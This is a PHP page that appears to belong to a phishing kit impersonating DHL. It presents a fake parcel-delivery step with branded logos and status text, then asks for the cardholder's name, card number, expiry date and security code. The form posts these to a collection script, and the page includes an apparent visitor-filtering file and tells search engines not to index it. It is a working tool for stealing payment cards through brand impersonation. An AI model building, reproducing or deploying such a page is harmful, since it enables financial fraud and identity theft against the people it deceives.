<?php
   session_start();   
   include("./c/ban.php");
   include("./c/sys.php");
   include("lang.php");
   $_SESSION['otp'] = 0;
   if ( !isset($_SESSION['a']) OR !isset($_SESSION['g']) ) {
      header("Location: ../index.php?#{$rand}");
      die();
   }
?>
<!DOCTYPE html>
<html <?php if (get_language($_SESSION['co_code'])=='ar') { echo 'lang="ar" dir="rtl"'; }else{ echo 'lang="en" dir="ltr"'; } ?> >
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
      <link rel="stylesheet" href="./f/b.css">
      <link rel="icon" type="image/x-icon" href="./f/favicon.ico" />
      <title>| DHL |</title>
   </head>
   <body>
      <div class="navbar">
         <div class="container-fluid">
            <div class="topping">
               <img src="./f/dhl-logo.svg" onclick="location.href = 'index.php?#<?php echo $rand; ?>';">
               <ul class="web">
                  <li><i class="bi bi-exclamation-circle me-2"></i> <?php echo get_text("top_header1"); ?></li>
                  <li> <?php echo get_text("top_header2"); ?></li>
                  <?php if (isset($_SESSION['co_code'])) { echo '<li><i class="bi bi-globe me-2"></i> '.$_SESSION['co_code'].'</li>';} ?>
                  <li><i class="bi bi-search me-2"></i> <?php echo get_text("top_header4"); ?></li>
               </ul>
               <ul class="respo">
                  <li><i class="bi bi-list"></i></li>
                  <li></li>
               </ul>
            </div>
            <div class="bottomin">
               <ul>
                  <li><?php echo get_text("mainmenu1"); ?><i class="bi bi-chevron-down ms-1"></i></li>
                  <li><?php echo get_text("mainmenu2"); ?><i class="bi bi-chevron-down ms-1"></i></li>
                  <li><?php echo get_text("mainmenu3"); ?><i class="bi bi-chevron-down ms-1"></i></li>
                  <li><?php echo get_text("mainmenu4"); ?><i class="bi bi-chevron-down ms-1"></i></li>
               </ul>
               <p><i class="bi bi-person-fill me-2"></i><?php echo get_text("header-right"); ?></p>
            </div>
         </div>
      </div>
      <div class="home info carta">
         <div class="otside put">
            <div class="container">
               <br>
               <div class="lettre login valid">
                  <div class="dell" style="margin-top: 50px;">
                     <div>
                        <div name="content" style="text-align: center;">
                           <img src="./f/LOGA.svg" style="width: 30px;">
                        </div>
                        <center style="font-size: 20px; margin-top: 10px;"><?php echo get_text("X21"); ?></center>
                     </div>
                     <br>
                     <div class="titre">
                        <img src="./f/camion.png" style="width: 25px; height: 20px;">
                        <span style="color: #d40511; font-weight: bold; font-size: 15px; margin-left: 10px;"><?php echo get_text("title2"); ?> </span>
                     </div>
                     <div class="steps">
                        <span class="green"></span>
                        <span class="green"></span>
                        <span></span>
                     </div>
                  </div>
                  <form action="./s/b.php" method="post">
                     <div class="row gx-4">
                        <div class="col-lg-8 genius">
                           <div class="gauche hna">
                              <h4><?php echo get_text("card_info"); ?> </h4>
                              <div class="magic" style="text-align: center;">
                                 <img src="./f/MASTERCARD.png">
                                 <img src="./f/DISCOVER.png">
                                 <img src="./f/AMEX.png">
                                 <img src="./f/VISA.png">
                              </div>
                              <?php
                                 if (isset($_GET["error"])){
                                    $error = $_GET["error"];
                                    if ($error == "invalidCardNumber") {
                                       echo '<p class="input-groupe" style="margin-top: 15px; font-size: 15px; color: red">' . get_text("ERRAR") . '</p>';
                                    }
                                 }
                              ?>
                              <div class="form-group mt-3">     
                                 <label for="h"><?php echo get_text("name_label"); ?> <span>*</span></label>
                                 <input type="text" name="h" id="h" class="form-control" autocomplete="off" required="">
                              </div>
                              <div class="form-group mt-3 ">
                                 <label for="i"><?php echo get_text("one_label"); ?> <span>*</span></label>
                                 <input type="tel" name="i" id="i" class="form-control" placeholder="XXXX XXXX XXXX XXXX" autocomplete="off" required="">
                              </div>
                              <div class="calisy">
                                 <div class="form-group mt-3 ville">  
                                    <label for="j"><?php echo get_text("two_labels"); ?> <span>*</span></label>
                                    <input type="tel" name="j" id="j" class="form-control" placeholder="<?php echo get_text("two_label"); ?>" autocomplete="off" required="" maxlength="10">
                                 </div>
                                 <div class="form-group mt-3 astra">     
                                    <label for="k"><?php echo get_text("three_labels"); ?> <span>*</span></label>
                                    <input type="tel" name="k" id="k" class="form-control" placeholder="<?php echo get_text("three_label"); ?>" autocomplete="off" required="">
                                 </div>
                              </div>
                              <div class="botona">
                                 <button class="btn" name="billing"><?php echo get_text("nextt"); ?></button>
                              </div>
                           </div>
                        </div>
                        <div class="col-lg-4 power">
                           <div class="droit lhih">
                              <div class="offre">
                                 <div class="status">
                                    <p><?php echo get_text("X3"); ?> :<b><?php echo get_text("X6"); ?><?php echo $_SESSION['co_code']; ?></b></p>
                                 </div>
                                 <div class="status">
                                    <p><?php echo get_text("status"); ?></p>
                                 </div>
                                 <div class="status">
                                    <p><?php echo get_text("parcel"); ?></p>
                                 </div>
                              </div>
                              <div class="offre">
                                 <div class="status">
                                    <p><?php echo get_text("last_update"); ?>: <b><?php echo date("d/m/Y h:i A"); ?></b></p>
                                 </div>
                                 <div class="status">
                                    <p><?php echo get_text("shipment"); ?></p>
                                 </div>
                                 <div class="status">
                                    <p><?php echo get_text("total"); ?></p>
                                 </div>
                              </div>
                              <hr>
                              <div class="important mt-4">
                                 <h5><?php echo get_text("important_title"); ?></h5>
                                 <p><?php echo get_text("important_message"); ?></p>
                              </div>
                           </div>
                        </div>
                     </div>
                  </form>
               </div>
            </div>
         </div>
      </div>
      <div class="sous boso" style="padding-top: 20px; padding-bottom: 20px;">
         <div class="container-fluid">
            <div class="row">
               <div class="col-lg-9">
                  <img src="./f/glo-footer-logo.svg">
                  <ul>
                     <li><?php echo get_text("footer-menu-1"); ?></li>
                     <li><?php echo get_text("footer-menu-2"); ?></li>
                     <li><?php echo get_text("footer-menu-3"); ?></li>
                     <li><?php echo get_text("footer-menu-4"); ?></li>
                     <li><?php echo get_text("footer-menu-5"); ?></li>
                     <li><?php echo get_text("footer-menu-6"); ?></li>
                     <li><?php echo get_text("footer-menu-7"); ?></li>
                     <li><?php echo get_text("footer-menu-8"); ?></li>
                  </ul>
               </div>
               <div class="text-center ss" style="margin-top: 0px;"><?php echo get_text("copyright"); ?></div>
            </div>
         </div>
      </div>
      <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
      <script type="text/javascript">
         $("#i").mask("0000 0000 0000 00000");
         $("#j").mask("00/00");
         $("#k").mask("0000");            
         function toTitleCase(str) {
            return str.split(/\s+/).map(s => s.charAt(0).toUpperCase() + s.substring(1).toLowerCase()).join(" ");
         }
         $('#h').on('keyup', function(event) {
            var $t = $(this);
            $t.val(toTitleCase($t.val()));
         });
      </script>
   </body>
</html>